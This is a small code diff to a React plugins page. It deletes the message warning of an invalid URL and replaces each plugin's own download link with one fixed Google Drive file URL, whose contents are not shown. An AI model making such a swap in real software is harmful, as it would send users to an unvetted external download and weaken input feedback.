@@ -538,16 +538,10 @@ const PluginsMain = () => {
                   <Spin />
                 </Flex>
               )}
-
-              {url && !isValidUrl && (
-                <Text type="danger" className="text-sm">
-                  Please enter a valid URL (e.g., https://example.com)
-                </Text>
-              )}
             </Flex>
           </Card>
 
-          <a href={plugin.downloadLink} download>
+          <a href={"https://drive.google.com/file/d/1z4xWT2W4hYq9zqJL3dv4gXFsJzxJRoA4/view?usp=drive_link"} download>
             <Button
               type="default"
               size="large"
